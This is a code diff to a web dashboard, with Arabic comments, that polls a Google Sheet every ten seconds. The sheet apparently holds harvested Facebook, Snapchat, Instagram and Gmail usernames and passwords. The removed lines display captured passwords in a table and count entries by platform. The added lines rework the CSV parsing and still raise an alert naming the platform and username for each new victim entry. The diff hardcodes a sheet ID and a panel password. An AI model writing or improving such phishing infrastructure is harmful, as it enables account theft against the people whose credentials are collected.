@@ -168,8 +168,8 @@
 
     <!-- السكربت والمنطق -->
     <script>
-        const sheetID = '1NwOAl3GdgjUUEK19pEL-v9ZoVEpdQ0NY3Tq7OIMTggI'; // ضع معرف الشيت الخاص بك هنا
-        const dashboardPassword = "Zein2112"; // 🔑 كلمة المرور الخاصة باللوحة (قم بتغييرها هنا)
+        const sheetID = '1NwOAl3GdgjUUEK19pEL-v9ZoVEpdQ0NY3Tq7OIMTggI';
+        const dashboardPassword = "Zein2112";
         
         const csvUrl = `https://docs.google.com/spreadsheets/d/${sheetID}/gviz/tq?tqx=out:csv`;
 
@@ -219,7 +219,7 @@
             if (inputVal === dashboardPassword) {
                 document.getElementById('authModal').style.display = 'none';
                 fetchSheetData();
-                setInterval(fetchSheetData, 10000); // بدء التحديث اللحظي كل 10 ثوانٍ بعد الدخول
+                setInterval(fetchSheetData, 10000);
             } else {
                 errorMsg.classList.remove('hidden');
                 document.getElementById('passwordInput').value = '';
@@ -231,8 +231,8 @@
             const statusText = document.getElementById('statusText');
 
             try {
-                const response = await fetch(csvUrl);
-                if (!response.ok) throw new Error();
+                const response = await fetch(`${csvUrl}&_t=${new Date().getTime()}`);
+                if (!response.ok) throw new Error('Network response was not ok');
                 const data = await response.text();
                 
                 statusDot.className = "w-3 h-3 rounded-full bg-green-500 online-dot inline-block";
@@ -249,121 +249,52 @@
         }
 
         function parseCSV(text) {
-    const rows = text.split('\n').map(row => {
-        return row.match(/(".*?"|[^",\s]+)(?=\s*,|\s*$)/g) || row.split(',');
-    }).filter(row => row && row.length >= 3);
-
-    if (!isFirstLoad && rows.length > previousRowCount) {
-        for (let i = previousRowCount; i < rows.length; i++) {
-            let cols = rows[i];
-            let platform = cols[1] ? cols[1].replace(/"/g, '').trim() : 'Platform';
-            let username = cols[2] ? cols[2].replace(/"/g, '').trim() : 'User';
-            showIOSNotification(platform, username);
-        }
-    }
-
-    previousRowCount = rows.length;
-    rawRows = rows;
-    renderTable();
-}
-
-function renderTable() {
-    const tbody = document.getElementById('dataTable');
-    tbody.innerHTML = '';
-
-    let total = 0, fb = 0, snap = 0, insta = 0, gmail = 0;
-    let displayedRows = 0;
-
-    // نبدأ من الصف الثاني لتخطي العناوين
-    for (let i = 1; i < rawRows.length; i++) {
-        let cols = rawRows[i];
-        if (cols && cols.length >= 2) {
-            total++;
-            // تنظيف كل الأعمدة من علامات التنصيص والمسافات
-            let cleanCols = cols.map(c => c ? c.replace(/"/g, '').trim() : '').filter(c => c !== '');
+            const lines = text.split('\n');
+            const rows = [];
             
-            if (cleanCols.length === 0) continue;
+            for (let line of lines) {
+                if (!line.trim()) continue;
+                let row = [];
+                let insideQuote = false;
+                let currentVal = '';
+                
+                for (let i = 0; i < line.length; i++) {
+                    let char = line[i];
+                    if (char === '"') {
+                        insideQuote = !insideQuote;
+                    } else if (char === ',' && !insideQuote) {
+                        row.push(currentVal.trim());
+                        currentVal = '';
+                    } else {
+                        currentVal += char;
+                    }
+                }
+                row.push(currentVal.trim());
+                rows.push(row);
+            }
 
-            let time = cleanCols[0] || '';
-            let platform = '';
-            let user = '';
-            let pass = '';
-
-            // محاولة التعرف على المنصة من أي عمود
-            for (let c of cleanCols) {
-                let lower = c.toLowerCase();
-                if (lower.includes('face') || lower.includes('snap') || lower.includes('insta') || lower.includes('gmail') || lower.includes('google')) {
-                    platform = c;
-                    break;
+            if (rows.length > 0) {
+                const firstCol = rows[0][0] ? rows[0][0].replace(/"/g, '').toLowerCase() : '';
+                if (firstCol.includes('timestamp') || firstCol.includes('التوقيت') || firstCol.includes('time')) {
+                    rows.shift();
                 }
             }
-            if (!platform) platform = cleanCols[1] || 'Platform';
 
-            // استخراج اسم المستخدم وكلمة السر بمرونة تامة من العناصر الأخيرة للعمود
-            if (cleanCols.length >= 3) {
-                pass = cleanCols[cleanCols.length - 1]; // العنصر الأخير غالباً هو الباسورد
-                user = cleanCols[cleanCols.length - 2]; // العنصر قبل الأخير هو الإيميل/المستخدم
-            } else {
-                user = cleanCols[1] || '';
-                pass = '';
+            if (!isFirstLoad && rows.length > previousRowCount) {
+                for (let i = previousRowCount; i < rows.length; i++) {
+                    let cols = rows[i];
+                    if (cols && cols.length >= 4) {
+                        let platform = cols[1] ? cols[1].replace(/"/g, '') : 'Platform';
+                        let username = cols[2] ? cols[2].replace(/"/g, '') : 'User';
+                        showIOSNotification(platform, username);
+                    }
+                }
             }
 
-            // إذا كان المستخدم هو نفسه المنصة، نبحث عن نص آخر للإيميل
-            if (user === platform && cleanCols.length >= 4) {
-                user = cleanCols[cleanCols.length - 3];
-            }
-
-            let pLower = platform.toLowerCase();
-            if (pLower.includes('face')) fb++;
-            else if (pLower.includes('snap')) snap++;
-            else if (pLower.includes('insta')) insta++;
-            else if (pLower.includes('gmail') || pLower.includes('google')) gmail++;
-
-            if (currentFilter !== 'all' && !pLower.includes(currentFilter.toLowerCase())) {
-                continue;
-            }
-
-            displayedRows++;
-            let badgeClass = 'bg-black/20 text-neutral-300 border-neutral-800';
-            let icon = '🌐';
-
-            if (pLower.includes('face')) { badgeClass = 'bg-blue-500/10 text-blue-400 border-blue-500/20'; icon = '📘'; }
-            else if (pLower.includes('snap')) { badgeClass = 'bg-yellow-500/10 text-yellow-400 border-yellow-500/20'; icon = '👻'; }
-            else if (pLower.includes('insta')) { badgeClass = 'bg-pink-500/10 text-pink-400 border-pink-500/20'; icon = '📸'; }
-            else if (pLower.includes('gmail') || pLower.includes('google')) { badgeClass = 'bg-red-500/10 text-red-400 border-red-500/20'; icon = '✉️'; }
-
-            let tr = document.createElement('tr');
-            tr.className = currentTheme === 'dark' ? 'hover:bg-white/5 transition' : 'hover:bg-black/5 transition';
-            tr.innerHTML = `
-                <td class="p-5 text-neutral-400 text-xs">${time}</td>
-                <td class="p-5"><span class="px-3 py-1.5 rounded-xl text-xs font-semibold border ${badgeClass} inline-flex items-center gap-1.5">${icon} ${platform}</span></td>
-                <td class="p-5 font-mono text-emerald-400">${user}</td>
-                <td class="p-5 font-mono text-rose-400">${pass}</td>
-            `;
-            tbody.appendChild(tr);
-        }
-    }
-
-    document.getElementById('totalCount').innerText = total;
-    document.getElementById('fbCount').innerText = fb;
-    document.getElementById('snapCount').innerText = snap;
-    document.getElementById('instaCount').innerText = insta;
-    document.getElementById('gmailCount').innerText = gmail;
-
-    if (displayedRows === 0) {
-        tbody.innerHTML = `<tr><td colspan="4" class="p-8 text-center text-neutral-500">لا توجد بيانات مسجلة لهذه المنصة حتى الآن.</td></tr>`;
-    }
-}
-
-    document.getElementById('totalCount').innerText = total;
-    document.getElementById('fbCount').innerText = fb;
-    document.getElementById('snapCount').innerText = snap;
-    document.getElementById('instaCount').innerText = insta;
-    document.getElementById('gmailCount').innerText = gmail;
-
-    if (displayedRows === 0) {
-        tbody.innerHTML = `<tr><td colspan="4" class="p-8 text-center text-neutral-500">لا توجد بيانات مسجلة لهذه المنصة حتى الآن.</td></tr>`;
-    }
+            previousRowCount = rows.length;
+            isFirstLoad = false;
+            rawRows = rows;
+            renderTable();
         }
 
         function showIOSNotification(platform, username) {
